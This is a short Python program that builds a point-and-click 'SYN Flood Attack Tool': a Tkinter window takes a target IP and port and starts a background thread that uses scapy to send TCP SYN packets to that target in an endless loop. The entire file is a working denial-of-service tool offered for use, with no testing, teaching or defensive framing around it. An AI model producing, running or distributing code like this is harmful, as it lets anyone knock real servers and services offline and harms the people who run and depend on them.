import threading
from scapy.all import *
import tkinter as tk
from tkinter import messagebox

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S')
    packet = ip/tcp
    send(packet, loop=1, verbose=0)

def start_attack():
    target_ip = ip_entry.get()
    target_port = int(port_entry.get())
    
    if not target_ip or not target_port:
        messagebox.showerror("Input Error", "Please enter both IP and Port.")
        return

    attack_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    attack_thread.daemon = True
    attack_thread.start()
    messagebox.showinfo("Attack Started", f"Attacking {target_ip}:{target_port}")

# GUI Setup
root = tk.Tk()
root.title("SYN Flood Attack Tool")

tk.Label(root, text="Target IP:").pack(pady=5)
ip_entry = tk.Entry(root)
ip_entry.pack(pady=5)

tk.Label(root, text="Target Port:").pack(pady=5)
port_entry = tk.Entry(root)
port_entry.pack(pady=5)

attack_button = tk.Button(root, text="Start Attack", command=start_attack)
attack_button.pack(pady=20)

root.mainloop()
